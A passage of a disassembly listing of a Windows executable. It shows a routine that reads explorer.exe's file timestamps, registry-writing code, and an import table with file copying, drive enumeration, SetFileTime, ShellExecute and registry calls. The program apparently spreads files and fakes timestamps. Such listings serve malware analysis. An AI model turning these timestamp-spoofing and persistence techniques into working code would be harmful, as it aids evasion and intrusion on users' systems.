.text:00402457                 push    1               ; dwType
.text:00402459                 push    0               ; Reserved
.text:0040245B                 push    [ebp+lpValueName] ; lpValueName
.text:0040245E                 push    [ebp+phkResult] ; hKey
.text:00402461                 call    RegSetValueExA
.text:00402466                 push    [ebp+phkResult] ; hKey
.text:00402469                 call    RegCloseKey
.text:0040246E                 leave
.text:0040246F                 retn    10h
.text:0040246F sub_402422      endp
.text:0040246F
.text:00402472
.text:00402472 ; =============== S U B R O U T I N E =======================================
.text:00402472
.text:00402472 ; Attributes: bp-based frame
.text:00402472
.text:00402472 ; BOOL sub_402472()
.text:00402472 sub_402472      proc near               ; CODE XREF: start+60↑p
.text:00402472
.text:00402472 hFile           = dword ptr -4
.text:00402472
.text:00402472                 push    ebp
.text:00402473                 mov     ebp, esp
.text:00402475                 add     esp, 0FFFFFFFCh
.text:00402478                 push    200h            ; uSize
.text:0040247D                 push    offset byte_40755E ; lpBuffer
.text:00402482                 call    GetWindowsDirectoryA
.text:00402487                 push    offset byte_40755E ; pszPath
.text:0040248C                 call    PathAddBackslashA
.text:00402491                 push    offset aExplorerExe ; "explorer.exe"
.text:00402496                 push    offset byte_40755E ; lpString1
.text:0040249B                 call    lstrcatA
.text:004024A0                 push    0               ; hTemplateFile
.text:004024A2                 push    0               ; dwFlagsAndAttributes
.text:004024A4                 push    3               ; dwCreationDisposition
.text:004024A6                 push    0               ; lpSecurityAttributes
.text:004024A8                 push    1               ; dwShareMode
.text:004024AA                 push    80000000h       ; dwDesiredAccess
.text:004024AF                 push    offset byte_40755E ; lpFileName
.text:004024B4                 call    CreateFileA
.text:004024B9                 mov     [ebp+hFile], eax
.text:004024BC                 push    offset LastWriteTime ; lpLastWriteTime
.text:004024C1                 push    offset LastAccessTime ; lpLastAccessTime
.text:004024C6                 push    offset CreationTime ; lpCreationTime
.text:004024CB                 push    [ebp+hFile]     ; hFile
.text:004024CE                 call    GetFileTime
.text:004024D3                 push    [ebp+hFile]     ; hObject
.text:004024D6                 call    CloseHandle
.text:004024DB                 leave
.text:004024DC                 retn
.text:004024DC sub_402472      endp
.text:004024DC
.text:004024DC ; ---------------------------------------------------------------------------
.text:004024DD                 align 2
.text:004024DE ; [00000006 BYTES: COLLAPSED FUNCTION BeginPaint]
.text:004024E4 ; [00000006 BYTES: COLLAPSED FUNCTION CreateWindowExA]
.text:004024EA ; [00000006 BYTES: COLLAPSED FUNCTION DefWindowProcA]
.text:004024F0 ; [00000006 BYTES: COLLAPSED FUNCTION DispatchMessageA]
.text:004024F6 ; [00000006 BYTES: COLLAPSED FUNCTION EndPaint]
.text:004024FC ; [00000006 BYTES: COLLAPSED FUNCTION GetDlgItemTextA]
.text:00402502 ; [00000006 BYTES: COLLAPSED FUNCTION GetMessageA]
.text:00402508 ; [00000006 BYTES: COLLAPSED FUNCTION GetSystemMetrics]
.text:0040250E ; [00000006 BYTES: COLLAPSED FUNCTION LoadCursorA]
.text:00402514 ; [00000006 BYTES: COLLAPSED FUNCTION MessageBoxA]
.text:0040251A ; [00000006 BYTES: COLLAPSED FUNCTION PeekMessageA]
.text:00402520 ; [00000006 BYTES: COLLAPSED FUNCTION RegisterClassExA]
.text:00402526 ; [00000006 BYTES: COLLAPSED FUNCTION SendMessageA]
.text:0040252C ; [00000006 BYTES: COLLAPSED FUNCTION SystemParametersInfoA]
.text:00402532 ; [00000006 BYTES: COLLAPSED FUNCTION TranslateMessage]
.text:00402538 ; [00000006 BYTES: COLLAPSED FUNCTION UpdateWindow]
.text:0040253E ; [00000006 BYTES: COLLAPSED FUNCTION CloseHandle]
.text:00402544 ; [00000006 BYTES: COLLAPSED FUNCTION CopyFileA]
.text:0040254A ; [00000006 BYTES: COLLAPSED FUNCTION CreateFileA]
.text:00402550 ; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess]
.text:00402556 ; [00000006 BYTES: COLLAPSED FUNCTION FindClose]
.text:0040255C ; [00000006 BYTES: COLLAPSED FUNCTION FindFirstFileA]
.text:00402562 ; [00000006 BYTES: COLLAPSED FUNCTION FindNextFileA]
.text:00402568 ; [00000006 BYTES: COLLAPSED FUNCTION FindResourceA]
.text:0040256E ; [00000006 BYTES: COLLAPSED FUNCTION FreeResource]
.text:00402574 ; [00000006 BYTES: COLLAPSED FUNCTION GetCommandLineA]
.text:0040257A ; [00000006 BYTES: COLLAPSED FUNCTION GetEnvironmentVariableA]
.text:00402580 ; [00000006 BYTES: COLLAPSED FUNCTION GetFileAttributesA]
.text:00402586 ; [00000006 BYTES: COLLAPSED FUNCTION GetFileSize]
.text:0040258C ; [00000006 BYTES: COLLAPSED FUNCTION GetFileTime]
.text:00402592 ; [00000006 BYTES: COLLAPSED FUNCTION GetLogicalDrives]
.text:00402598 ; [00000006 BYTES: COLLAPSED FUNCTION GetModuleFileNameA]
.text:0040259E ; [00000006 BYTES: COLLAPSED FUNCTION GetModuleHandleA]
.text:004025A4 ; [00000006 BYTES: COLLAPSED FUNCTION GetProcessHeap]
.text:004025AA ; [00000006 BYTES: COLLAPSED FUNCTION GetTempPathA]
.text:004025B0 ; [00000006 BYTES: COLLAPSED FUNCTION GetWindowsDirectoryA]
.text:004025B6 ; [00000006 BYTES: COLLAPSED FUNCTION GlobalFree]
.text:004025BC ; [00000006 BYTES: COLLAPSED FUNCTION HeapAlloc]
.text:004025C2 ; [00000006 BYTES: COLLAPSED FUNCTION LoadResource]
.text:004025C8 ; [00000006 BYTES: COLLAPSED FUNCTION LockResource]
.text:004025CE ; [00000006 BYTES: COLLAPSED FUNCTION MoveFileA]
.text:004025D4 ; [00000006 BYTES: COLLAPSED FUNCTION ReadFile]
.text:004025DA ; [00000006 BYTES: COLLAPSED FUNCTION RtlMoveMemory]
.text:004025E0 ; [00000006 BYTES: COLLAPSED FUNCTION SetErrorMode]
.text:004025E6 ; [00000006 BYTES: COLLAPSED FUNCTION SetFilePointer]
.text:004025EC ; [00000006 BYTES: COLLAPSED FUNCTION SetFileTime]
.text:004025F2 ; [00000006 BYTES: COLLAPSED FUNCTION SizeofResource]
.text:004025F8 ; [00000006 BYTES: COLLAPSED FUNCTION WriteFile]
.text:004025FE ; [00000006 BYTES: COLLAPSED FUNCTION lstrcatA]
.text:00402604 ; [00000006 BYTES: COLLAPSED FUNCTION lstrcmpA]
.text:0040260A ; [00000006 BYTES: COLLAPSED FUNCTION lstrcmpiA]
.text:00402610 ; [00000006 BYTES: COLLAPSED FUNCTION lstrcpyA]
.text:00402616 ; [00000006 BYTES: COLLAPSED FUNCTION lstrlenA]
.text:0040261C ; [00000006 BYTES: COLLAPSED FUNCTION SHGetSpecialFolderPathA]
.text:00402622 ; [00000006 BYTES: COLLAPSED FUNCTION ShellExecuteA]
.text:00402628 ; [00000006 BYTES: COLLAPSED FUNCTION CryptAcquireContextA]
.text:0040262E ; [00000006 BYTES: COLLAPSED FUNCTION CryptCreateHash]
.text:00402634 ; [00000006 BYTES: COLLAPSED FUNCTION CryptDestroyHash]
.text:0040263A ; [00000006 BYTES: COLLAPSED FUNCTION CryptGetHashParam]
.text:00402640 ; [00000006 BYTES: COLLAPSED FUNCTION CryptHashData]
.text:00402646 ; [00000006 BYTES: COLLAPSED FUNCTION CryptReleaseContext]
.text:0040264C ; [00000006 BYTES: COLLAPSED FUNCTION RegCloseKey]
.text:00402652 ; [00000006 BYTES: COLLAPSED FUNCTION RegCreateKeyExA]
.text:00402658 ; [00000006 BYTES: COLLAPSED FUNCTION RegDeleteKeyA]
.text:0040265E ; [00000006 BYTES: COLLAPSED FUNCTION RegSetValueExA]
.text:00402664 ; [00000006 BYTES: COLLAPSED FUNCTION PathAddBackslashA]
.text:0040266A ; [00000006 BYTES: COLLAPSED FUNCTION PathFindExtensionA]
.text:00402670 ; [00000006 BYTES: COLLAPSED FUNCTION PathFindFileNameA]
.text:00402676 ; [00000006 BYTES: COLLAPSED FUNCTION PathMatchSpecA]
.text:0040267C ; [00000006 BYTES: COLLAPSED FUNCTION CreateFontIndirectA]
.text:00402682 ; [00000006 BYTES: COLLAPSED FUNCTION InitCommonControls]
.text:00402688                 align 200h
.text:00402800                 dd 200h dup(?)
.text:00402800 _text           ends
.text:00402800
.idata:00403000 ; Section 2. (virtual address 00003000)
.idata:00403000 ; Virtual size                  : 00000820 (   2080.)
.idata:00403000 ; Section size in file          : 00000A00 (   2560.)
.idata:00403000 ; Offset to raw data for section: 00001C00
.idata:00403000 ; Flags 40000040: Data Readable
.idata:00403000 ; Alignment     : default
.idata:00403000 ;
.idata:00403000 ; Imports from advapi32.dll
.idata:00403000 ;
.idata:00403000 ; ===========================================================================
.idata:00403000
.idata:00403000 ; Segment type: Externs
.idata:00403000 ; _idata
.idata:00403000 ; LSTATUS (__stdcall *RegCreateKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition)
.idata:00403000                 extrn __imp_RegCreateKeyExA:dword
.idata:00403000                                         ; DATA XREF: RegCreateKeyExA↑r
.idata:00403000                                         ; .rdata:0040315C↓o
.idata:00403000                                         ; advapi32
.idata:00403004 ; BOOL (__stdcall *CryptCreateHash)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH *phHash)
.idata:00403004                 extrn __imp_CryptCreateHash:dword
.idata:00403004                                         ; DATA XREF: CryptCreateHash↑r
.idata:00403004                                         ; advapi32
.idata:00403008 ; BOOL (__stdcall *CryptDestroyHash)(HCRYPTHASH hHash)
.idata:00403008                 extrn __imp_CryptDestroyHash:dword
.idata:00403008                                         ; DATA XREF: CryptDestroyHash↑r
.idata:00403008                                         ; advapi32
.idata:0040300C ; BOOL (__stdcall *CryptGetHashParam)(HCRYPTHASH hHash, DWORD dwParam, BYTE *pbData, DWORD *pdwDataLen, DWORD dwFlags)
.idata:0040300C                 extrn __imp_CryptGetHashParam:dword
.idata:0040300C                                         ; DATA XREF: CryptGetHashParam↑r
.idata:0040300C                                         ; advapi32
.idata:00403010 ; LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData)
.idata:00403010                 extrn __imp_RegSetValueExA:dword
.idata:00403010                                         ; DATA XREF: RegSetValueExA↑r
.idata:00403010                                         ; advapi32
.idata:00403014 ; LSTATUS (__stdcall *RegDeleteKeyA)(HKEY hKey, LPCSTR lpSubKey)
.idata:00403014                 extrn __imp_RegDeleteKeyA:dword
.idata:00403014                                         ; DATA XREF: RegDeleteKeyA↑r
.idata:00403014                                         ; advapi32
.idata:00403018 ; BOOL (__stdcall *CryptAcquireContextA)(HCRYPTPROV *phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags)
.idata:00403018                 extrn __imp_CryptAcquireContextA:dword
.idata:00403018                                         ; DATA XREF: CryptAcquireContextA↑r
.idata:00403018                                         ; advapi32
.idata:0040301C ; LSTATUS (__stdcall *RegCloseKey)(HKEY hKey)
.idata:0040301C                 extrn __imp_RegCloseKey:dword
.idata:0040301C                                         ; DATA XREF: RegCloseKey↑r
.idata:0040301C                                         ; advapi32
.idata:00403020 ; BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags)
.idata:00403020                 extrn __imp_CryptReleaseContext:dword
.idata:00403020                                         ; DATA XREF: CryptReleaseContext↑r
.idata:00403020                                         ; advapi32
.idata:00403024 ; BOOL (__stdcall *CryptHashData)(HCRYPTHASH hHash, const BYTE *pbData, DWORD dwDataLen, DWORD dwFlags)
.idata:00403024                 extrn __imp_CryptHashData:dword
.idata:00403024                                         ; DATA XREF: CryptHashData↑r
.idata:00403024                                         ; advapi32
.idata:00403028
.idata:0040302C ;
.idata:0040302C ; Imports from comctl32.dll
.idata:0040302C ;
.idata:0040302C ; void (__stdcall *InitCommonControls)()
.idata:0040302C                 extrn __imp_InitCommonControls:dword
.idata:0040302C                                         ; DATA XREF: InitCommonControls↑r
.idata:0040302C                                         ; .rdata:00403170↓o
.idata:0040302C                                         ; comctl32
.idata:00403030
.idata:00403034 ;
.idata:00403034 ; Imports from gdi32.dll
.idata:00403034 ;
.idata:00403034 ; HFONT (__stdcall *CreateFontIndirectA)(const LOGFONTA *lplf)
.idata:00403034                 extrn __imp_CreateFontIndirectA:dword
.idata:00403034                                         ; DATA XREF: CreateFontIndirectA↑r
.idata:00403034                                         ; .rdata:00403184↓o
.idata:00403034                                         ; gdi32
.idata:00403038
.idata:0040303C ;
.idata:0040303C ; Imports from KERNEL32.DLL
.idata:0040303C ;
.idata:0040303C ; int (__stdcall *lstrlenA)(LPCSTR lpString)
.idata:0040303C                 extrn __imp_lstrlenA:dword ; DATA XREF: lstrlenA↑r
.idata:0040303C                                         ; .rdata:00403148↓o
.idata:0040303C                                         ; KERNEL32
.idata:00403040 ; BOOL (__stdcall *CloseHandle)(HANDLE hObject)
.idata:00403040                 extrn __imp_CloseHandle:dword
.idata:00403040                                         ; DATA XREF: CloseHandle↑r
.idata:00403040                                         ; KERNEL32
.idata:00403044 ; BOOL (__stdcall *CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists)
.idata:00403044                 extrn __imp_CopyFileA:dword
.idata:00403044                                         ; DATA XREF: CopyFileA↑r
.idata:00403044                                         ; KERNEL32
.idata:00403048 ; HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
.idata:00403048                 extrn __imp_CreateFileA:dword
.idata:00403048                                         ; DATA XREF: CreateFileA↑r
.idata:00403048                                         ; KERNEL32
.idata:0040304C ; void (__stdcall __noreturn *ExitProcess)(UINT uExitCode)
.idata:0040304C                 extrn __imp_ExitProcess:dword
.idata:0040304C                                         ; DATA XREF: ExitProcess↑r
.idata:0040304C                                         ; KERNEL32
.idata:00403050 ; BOOL (__stdcall *FindClose)(HANDLE hFindFile)
.idata:00403050                 extrn __imp_FindClose:dword
.idata:00403050                                         ; DATA XREF: FindClose↑r
.idata:00403050                                         ; KERNEL32
.idata:00403054 ; HANDLE (__stdcall *FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)
.idata:00403054                 extrn __imp_FindFirstFileA:dword
.idata:00403054                                         ; DATA XREF: FindFirstFileA↑r
.idata:00403054                                         ; KERNEL32
.idata:00403058 ; BOOL (__stdcall *FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
.idata:00403058                 extrn __imp_FindNextFileA:dword
.idata:00403058                                         ; DATA XREF: FindNextFileA↑r
.idata:00403058                                         ; KERNEL32
.idata:0040305C ; HRSRC (__stdcall *FindResourceA)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType)
.idata:0040305C                 extrn __imp_FindResourceA:dword
.idata:0040305C                                         ; DATA XREF: FindResourceA↑r
.idata:0040305C                                         ; KERNEL32
.idata:00403060 ; BOOL (__stdcall *FreeResource)(HGLOBAL hResData)
.idata:00403060                 extrn __imp_FreeResource:dword
.idata:00403060                                         ; DATA XREF: FreeResource↑r
.idata:00403060                                         ; KERNEL32
.idata:00403064 ; LPSTR (__stdcall *GetCommandLineA)()
.idata:00403064                 extrn __imp_GetCommandLineA:dword
.idata:00403064                                         ; DATA XREF: GetCommandLineA↑r
.idata:00403064                                         ; KERNEL32
.idata:00403068 ; DWORD (__stdcall *GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize)
.idata:00403068                 extrn __imp_GetEnvironmentVariableA:dword
.idata:00403068                                         ; DATA XREF: GetEnvironmentVariableA↑r
.idata:00403068                                         ; KERNEL32
.idata:0040306C ; DWORD (__stdcall *GetFileAttributesA)(LPCSTR lpFileName)
.idata:0040306C                 extrn __imp_GetFileAttributesA:dword
.idata:0040306C                                         ; DATA XREF: GetFileAttributesA↑r
.idata:0040306C                                         ; KERNEL32
.idata:00403070 ; DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh)
.idata:00403070                 extrn __imp_GetFileSize:dword
.idata:00403070                                         ; DATA XREF: GetFileSize↑r
.idata:00403070                                         ; KERNEL32
.idata:00403074 ; BOOL (__stdcall *GetFileTime)(HANDLE hFile, LPFILETIME lpCreationTime, LPFILETIME lpLastAccessTime, LPFILETIME lpLastWriteTime)
.idata:00403074                 extrn __imp_GetFileTime:dword
.idata:00403074                                         ; DATA XREF: GetFileTime↑r
.idata:00403074                                         ; KERNEL32
.idata:00403078 ; DWORD (__stdcall *GetLogicalDrives)()
.idata:00403078                 extrn __imp_GetLogicalDrives:dword
.idata:00403078                                         ; DATA XREF: GetLogicalDrives↑r
.idata:00403078                                         ; KERNEL32
.idata:0040307C ; DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize)
.idata:0040307C                 extrn __imp_GetModuleFileNameA:dword
.idata:0040307C                                         ; DATA XREF: GetModuleFileNameA↑r
.idata:0040307C                                         ; KERNEL32
.idata:00403080 ; HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName)
.idata:00403080                 extrn __imp_GetModuleHandleA:dword
.idata:00403080                                         ; DATA XREF: GetModuleHandleA↑r
.idata:00403080                                         ; KERNEL32
.idata:00403084 ; HANDLE (__stdcall *GetProcessHeap)()
.idata:00403084                 extrn __imp_GetProcessHeap:dword
.idata:00403084                                         ; DATA XREF: GetProcessHeap↑r
.idata:00403084                                         ; KERNEL32
.idata:00403088 ; DWORD (__stdcall *GetTempPathA)(DWORD nBufferLength, LPSTR lpBuffer)
.idata:00403088                 extrn __imp_GetTempPathA:dword
.idata:00403088                                         ; DATA XREF: GetTempPathA↑r
.idata:00403088                                         ; KERNEL32
.idata:0040308C ; UINT (__stdcall *GetWindowsDirectoryA)(LPSTR lpBuffer, UINT uSize)
.idata:0040308C                 extrn __imp_GetWindowsDirectoryA:dword
.idata:0040308C                                         ; DATA XREF: GetWindowsDirectoryA↑r
.idata:0040308C                                         ; KERNEL32
.idata:00403090 ; HGLOBAL (__stdcall *GlobalFree)(HGLOBAL hMem)
.idata:00403090                 extrn __imp_GlobalFree:dword
.idata:00403090                                         ; DATA XREF: GlobalFree↑r
.idata:00403090                                         ; KERNEL32
.idata:00403094 ; LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)
.idata:00403094                 extrn __imp_HeapAlloc:dword
.idata:00403094                                         ; DATA XREF: HeapAlloc↑r
.idata:00403094                                         ; KERNEL32
.idata:00403098 ; HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo)
.idata:00403098                 extrn __imp_LoadResource:dword
.idata:00403098                                         ; DATA XREF: LoadResource↑r
.idata:00403098                                         ; KERNEL32
.idata:0040309C ; LPVOID (__stdcall *LockResource)(HGLOBAL hResData)
.idata:0040309C                 extrn __imp_LockResource:dword
.idata:0040309C                                         ; DATA XREF: LockResource↑r
.idata:0040309C                                         ; KERNEL32
.idata:004030A0 ; BOOL (__stdcall *MoveFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName)
.idata:004030A0                 extrn __imp_MoveFileA:dword
.idata:004030A0                                         ; DATA XREF: MoveFileA↑r
.idata:004030A0                                         ; KERNEL32
.idata:004030A4 ; BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
.idata:004030A4                 extrn __imp_ReadFile:dword ; DATA XREF: ReadFile↑r
.idata:004030A4                                         ; KERNEL32
.idata:004030A8                 extrn __imp_RtlMoveMemory:dword
.idata:004030A8                                         ; DATA XREF: RtlMoveMemory↑r
.idata:004030A8                                         ; KERNEL32
.idata:004030AC ; UINT (__stdcall *SetErrorMode)(UINT uMode)
.idata:004030AC                 extrn __imp_SetErrorMode:dword
.idata:004030AC                                         ; DATA XREF: SetErrorMode↑r
.idata:004030AC                                         ; KERNEL32
.idata:004030B0 ; DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
.idata:004030B0                 extrn __imp_SetFilePointer:dword
.idata:004030B0                                         ; DATA XREF: SetFilePointer↑r
.idata:004030B0                                         ; KERNEL32
.idata:004030B4 ; BOOL (__stdcall *SetFileTime)(HANDLE hFile, const FILETIME *lpCreationTime, const FILETIME *lpLastAccessTime, const FILETIME *lpLastWriteTime)
.idata:004030B4                 extrn __imp_SetFileTime:dword
.idata:004030B4                                         ; DATA XREF: SetFileTime↑r
.idata:004030B4                                         ; KERNEL32
.idata:004030B8 ; DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo)
.idata:004030B8                 extrn __imp_SizeofResource:dword
.idata:004030B8                                         ; DATA XREF: SizeofResource↑r
.idata:004030B8                                         ; KERNEL32
.idata:004030BC ; BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
.idata:004030BC                 extrn __imp_WriteFile:dword
.idata:004030BC                                         ; DATA XREF: WriteFile↑r
.idata:004030BC                                         ; KERNEL32
.idata:004030C0 ; LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2)
.idata:004030C0                 extrn __imp_lstrcatA:dword ; DATA XREF: lstrcatA↑r
.idata:004030C0                                         ; KERNEL32
.idata:004030C4 ; int (__stdcall *lstrcmpA)(LPCSTR lpString1, LPCSTR lpString2)
.idata:004030C4                 extrn __imp_lstrcmpA:dword ; DATA XREF: lstrcmpA↑r
.idata:004030C4                                         ; KERNEL32
.idata:004030C8 ; int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2)
.idata:004030C8                 extrn __imp_lstrcmpiA:dword
.idata:004030C8                                         ; DATA XREF: lstrcmpiA↑r
.idata:004030C8                                         ; KERNEL32
.idata:004030CC ; LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2)
.idata:004030CC                 extrn __imp_lstrcpyA:dword ; DATA XREF: lstrcpyA↑r
.idata:004030CC                                         ; KERNEL32
.idata:004030D0
.idata:004030D4 ;
.idata:004030D4 ; Imports from shell32.dll
.idata:004030D4 ;
.idata:004030D4 ; HINSTANCE (__stdcall *ShellExecuteA)(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd)
.idata:004030D4                 extrn __imp_ShellExecuteA:dword
.idata:004030D4                                         ; DATA XREF: ShellExecuteA↑r
.idata:004030D4                                         ; .rdata:00403198↓o
.idata:004030D4                                         ; shell32
.idata:004030D8 ; BOOL (__stdcall *SHGetSpecialFolderPathA)(HWND hwnd, LPSTR pszPath, int csidl, BOOL fCreate)
.idata:004030D8                 extrn __imp_SHGetSpecialFolderPathA:dword
.idata:004030D8                                         ; DATA XREF: SHGetSpecialFolderPathA↑r
.idata:004030D8                                         ; shell32
.idata:004030DC
.idata:004030E0 ;
.idata:004030E0 ; Imports from shlwapi.dll
.idata:004030E0 ;
.idata:004030E0 ; LPSTR (__stdcall *PathFindFileNameA)(LPCSTR pszPath)
.idata:004030E0                 extrn __imp_PathFindFileNameA:dword
.idata:004030E0                                         ; DATA XREF: PathFindFileNameA↑r
.idata:004030E0                                         ; .rdata:004031AC↓o
.idata:004030E0                                         ; shlwapi
.idata:004030E4 ; LPSTR (__stdcall *PathFindExtensionA)(LPCSTR pszPath)
.idata:004030E4                 extrn __imp_PathFindExtensionA:dword
.idata:004030E4                                         ; DATA XREF: PathFindExtensionA↑r
.idata:004030E4                                         ; shlwapi
.idata:004030E8 ; LPSTR (__stdcall *PathAddBackslashA)(LPSTR pszPath)
.idata:004030E8                 extrn __imp_PathAddBackslashA:dword
.idata:004030E8                                         ; DATA XREF: PathAddBackslashA↑r
.idata:004030E8                                         ; shlwapi
.idata:004030EC ; BOOL (__stdcall *PathMatchSpecA)(LPCSTR pszFile, LPCSTR pszSpec)
.idata:004030EC                 extrn __imp_PathMatchSpecA:dword
.idata:004030EC                                         ; DATA XREF: PathMatchSpecA↑r
.idata:004030EC                                         ; shlwapi
.idata:004030F0
.idata:004030F4 ;
.idata:004030F4 ; Imports from user32.dll
.idata:004030F4 ;
.idata:004030F4 ; ATOM (__stdcall *RegisterClassExA)(const WNDCLASSEXA *)
.idata:004030F4                 extrn __imp_RegisterClassExA:dword
.idata:004030F4                                         ; DATA XREF: RegisterClassExA↑r
.idata:004030F4                                         ; .rdata:004031C0↓o
.idata:004030F4                                         ; user32
.idata:004030F8 ; BOOL (__stdcall *PeekMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg)
.idata:004030F8                 extrn __imp_PeekMessageA:dword
.idata:004030F8                                         ; DATA XREF: PeekMessageA↑r
.idata:004030F8                                         ; user32
.idata:004030FC ; LRESULT (__stdcall *SendMessageA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
.idata:004030FC                 extrn __imp_SendMessageA:dword
.idata:004030FC                                         ; DATA XREF: SendMessageA↑r
.idata:004030FC                                         ; user32
.idata:00403100 ; HCURSOR (__stdcall *LoadCursorA)(HINSTANCE hInstance, LPCSTR lpCursorName)
.idata:00403100                 extrn __imp_LoadCursorA:dword
.idata:00403100                                         ; DATA XREF: LoadCursorA↑r
.idata:00403100                                         ; user32
.idata:00403104 ; int (__stdcall *GetSystemMetrics)(int nIndex)
.idata:00403104                 extrn __imp_GetSystemMetrics:dword
.idata:00403104                                         ; DATA XREF: GetSystemMetrics↑r
.idata:00403104                                         ; user32
.idata:00403108 ; BOOL (__stdcall *GetMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax)
.idata:00403108                 extrn __imp_GetMessageA:dword
.idata:00403108                                         ; DATA XREF: GetMessageA↑r
.idata:00403108                                         ; user32
.idata:0040310C ; UINT (__stdcall *GetDlgItemTextA)(HWND hDlg, int nIDDlgItem, LPSTR lpString, int cchMax)
.idata:0040310C                 extrn __imp_GetDlgItemTextA:dword
.idata:0040310C                                         ; DATA XREF: GetDlgItemTextA↑r
.idata:0040310C                                         ; user32
.idata:00403110 ; BOOL (__stdcall *EndPaint)(HWND hWnd, const PAINTSTRUCT *lpPaint)
.idata:00403110                 extrn __imp_EndPaint:dword ; DATA XREF: EndPaint↑r
.idata:00403110                                         ; user32
.idata:00403114 ; BOOL (__stdcall *SystemParametersInfoA)(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni)
.idata:00403114                 extrn __imp_SystemParametersInfoA:dword
.idata:00403114                                         ; DATA XREF: SystemParametersInfoA↑r
.idata:00403114                                         ; user32
.idata:00403118 ; BOOL (__stdcall *TranslateMessage)(const MSG *lpMsg)
.idata:00403118                 extrn __imp_TranslateMessage:dword
.idata:00403118                                         ; DATA XREF: TranslateMessage↑r
.idata:00403118                                         ; user32
.idata:0040311C ; BOOL (__stdcall *UpdateWindow)(HWND hWnd)
.idata:0040311C                 extrn __imp_UpdateWindow:dword
.idata:0040311C                                         ; DATA XREF: UpdateWindow↑r
.idata:0040311C                                         ; user32
.idata:00403120 ; int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
.idata:00403120                 extrn __imp_MessageBoxA:dword
.idata:00403120                                         ; DATA XREF: MessageBoxA↑r
.idata:00403120                                         ; user32
.idata:00403124 ; LRESULT (__stdcall *DispatchMessageA)(const MSG *lpMsg)
.idata:00403124                 extrn __imp_DispatchMessageA:dword
.idata:00403124                                         ; DATA XREF: DispatchMessageA↑r
.idata:00403124                                         ; user32
.idata:00403128 ; LRESULT (__stdcall *DefWindowProcA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
.idata:00403128                 extrn __imp_DefWindowProcA:dword
.idata:00403128                                         ; DATA XREF: DefWindowProcA↑r
.idata:00403128                                         ; user32
.idata:0040312C ; HWND (__stdcall *CreateWindowExA)(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam)
.idata:0040312C                 extrn __imp_CreateWindowExA:dword
.idata:0040312C                                         ; DATA XREF: CreateWindowExA↑r
.idata:0040312C                                         ; user32
.idata:00403130 ; HDC (__stdcall *BeginPaint)(HWND hWnd, LPPAINTSTRUCT lpPaint)
.idata:00403130                 extrn __imp_BeginPaint:dword
.idata:00403130                                         ; DATA XREF: BeginPaint↑r
.idata:00403130                                         ; user32
.rdata:00403134 ; ===========================================================================
.rdata:00403134
.rdata:00403134 ; Segment type: Pure data
.rdata:00403134 ; Segment permissions: Read
.rdata:00403134 _rdata          segment para public 'DATA' use32
.rdata:00403134                 assume cs:_rdata
.rdata:00403134                 ;org 403134h
.rdata:00403134                 align 8
.rdata:00403138 __IMPORT_DESCRIPTOR_KERNEL32 dd 0       ; Import Name Table
.rdata:0040313C                 dd 0                    ; Time stamp
.rdata:00403140                 dd 0                    ; Forwarder Chain
.rdata:00403144                 dd rva aKernel32Dll     ; DLL Name
.rdata:00403148                 dd rva __imp_lstrlenA   ; Import Address Table
.rdata:0040314C __IMPORT_DESCRIPTOR_advapi32 dd 0       ; Import Name Table
